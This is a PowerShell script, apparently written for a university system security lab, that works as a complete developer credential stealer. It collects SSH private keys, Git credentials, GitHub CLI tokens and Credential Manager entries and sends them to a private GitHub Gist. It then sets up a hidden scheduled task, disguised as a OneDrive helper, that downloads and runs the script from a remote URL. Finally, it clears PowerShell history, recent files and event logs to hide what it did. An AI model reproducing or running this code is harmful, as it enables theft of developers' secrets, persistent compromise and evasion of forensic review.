# ============================================================
#  "DevRecon" – Multi-Stage Developer Credential Harvester
#  Autoren: Raphael Bleier, Joachim Lugger
#  System Security Lab SS2026 – AAU Klagenfurt
#
#  Ablauf:
#    1. Recon   – SSH-Keys, Git-Credentials, GitHub-CLI Token
#    2. Exfil   – Privates GitHub Gist (HTTPS → nie geblockt)
#    3. Persist  – Versteckter Scheduled Task lädt dieses Script
#                  erneut von GitHub Gist (kein lokaler Server)
#    4. OPSEC   – PS-History, Temp-Dateien, Recent Files löschen
#
#  Setup:
#    1. GitHub PAT mit "gist"-Scope erstellen
#    2. GITHUB_PAT und PERSIST_GIST_RAW_URL unten eintragen
#       (PERSIST_GIST_RAW_URL = Raw-URL dieses Scripts auf Gist)
# ============================================================

$GITHUB_PAT          = "GITHUB_PAT_HERE"
$PERSIST_GIST_RAW_URL = "GIST_RAW_URL"   # Raw-URL dieses Scripts für Scheduled Task

# ── PHASE 1: RECON ──────────────────────────────────────────

$report = [System.Text.StringBuilder]::new()
$null = $report.AppendLine("=== DevRecon | $(Get-Date -Format 'yyyy-MM-dd HH:mm') ===")
$null = $report.AppendLine("Host: $env:COMPUTERNAME | User: $env:USERNAME | OS: $((Get-WmiObject Win32_OperatingSystem).Caption)")
$null = $report.AppendLine("")

# SSH Private Keys
$null = $report.AppendLine("── SSH KEYS ──────────────────────────────────────────────")
$sshDir = Join-Path $env:USERPROFILE ".ssh"
if (Test-Path $sshDir) {
    Get-ChildItem $sshDir -File | ForEach-Object {
        $null = $report.AppendLine("[ $($_.Name) ]")
        $null = $report.AppendLine((Get-Content $_.FullName -Raw -ErrorAction SilentlyContinue))
        $null = $report.AppendLine("")
    }
} else {
    $null = $report.AppendLine("(kein .ssh Verzeichnis)")
}

# .git-credentials – GitHub-Tokens im Klartext
$null = $report.AppendLine("── GIT CREDENTIALS ───────────────────────────────────────")
$gitCreds = Join-Path $env:USERPROFILE ".git-credentials"
if (Test-Path $gitCreds) {
    $null = $report.AppendLine((Get-Content $gitCreds -Raw))
} else {
    $null = $report.AppendLine("(keine .git-credentials)")
}

# .gitconfig
$null = $report.AppendLine("── .GITCONFIG ────────────────────────────────────────────")
$gitConfig = Join-Path $env:USERPROFILE ".gitconfig"
if (Test-Path $gitConfig) {
    $null = $report.AppendLine((Get-Content $gitConfig -Raw))
} else {
    $null = $report.AppendLine("(keine .gitconfig)")
}

# GitHub CLI Token
$null = $report.AppendLine("── GITHUB CLI TOKEN ──────────────────────────────────────")
$ghHosts = Join-Path $env:APPDATA "GitHub CLI\hosts.yml"
if (-not (Test-Path $ghHosts)) { $ghHosts = Join-Path $env:LOCALAPPDATA "GitHub\hosts.yml" }
if (Test-Path $ghHosts) {
    $null = $report.AppendLine((Get-Content $ghHosts -Raw))
} else {
    $null = $report.AppendLine("(kein GitHub CLI Token)")
}

# Windows Credential Manager
$null = $report.AppendLine("── CREDENTIAL MANAGER (git) ──────────────────────────────")
$null = $report.AppendLine((cmdkey /list 2>&1 | Where-Object { $_ -match "git|github" } | Out-String))

# ── PHASE 2: EXFIL via privates GitHub Gist ─────────────────

$headers = @{
    "Authorization" = "token $GITHUB_PAT"
    "Content-Type"  = "application/json"
    "User-Agent"    = "git/2.40.0"
}
$body = @{
    description = "sync_$(Get-Date -Format 'yyyyMMdd_HHmm')"
    public      = $false
    files       = @{ "report.txt" = @{ content = $report.ToString() } }
} | ConvertTo-Json -Depth 5

try {
    Invoke-RestMethod -Uri "https://api.github.com/gists" `
        -Method POST -Headers $headers -Body $body | Out-Null
} catch { }

# ── PHASE 3: PERSISTENZ – Scheduled Task via Gist ───────────
# Der Task lädt dieses Script direkt von GitHub Gist –
# kein lokaler Server, funktioniert über alle Subnetze.

$taskName = "OneDrive Sync Helper"

if (-not (Get-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue)) {
    $cmd = "-WindowStyle Hidden -NonInteractive -ExecutionPolicy Bypass -Command " +
           "`"IEX (New-Object Net.WebClient).DownloadString('$PERSIST_GIST_RAW_URL')`""

    $action    = New-ScheduledTaskAction -Execute "powershell.exe" -Argument $cmd
    $trigger   = New-ScheduledTaskTrigger -Weekly -DaysOfWeek Monday -At "09:15"
    $settings  = New-ScheduledTaskSettingsSet -Hidden -ExecutionTimeLimit (New-TimeSpan -Minutes 2)
    $principal = New-ScheduledTaskPrincipal -UserId $env:USERNAME -RunLevel Limited

    Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger `
        -Settings $settings -Principal $principal -ErrorAction SilentlyContinue | Out-Null
}

# ── PHASE 4: OPSEC ──────────────────────────────────────────

$histFile = (Get-PSReadLineOption -ErrorAction SilentlyContinue).HistorySavePath
if ($histFile -and (Test-Path $histFile)) {
    Remove-Item $histFile -Force -ErrorAction SilentlyContinue
}
[Microsoft.PowerShell.PSConsoleReadLine]::ClearHistory()
Clear-History
Remove-Item "$env:APPDATA\Microsoft\Windows\Recent\*" -Force -Recurse -ErrorAction SilentlyContinue
Remove-Item "$env:TEMP\*.xml" -Force -ErrorAction SilentlyContinue
[System.Diagnostics.Eventing.Reader.EventLogSession]::GlobalSession.ClearLog("Windows PowerShell") 2>$null
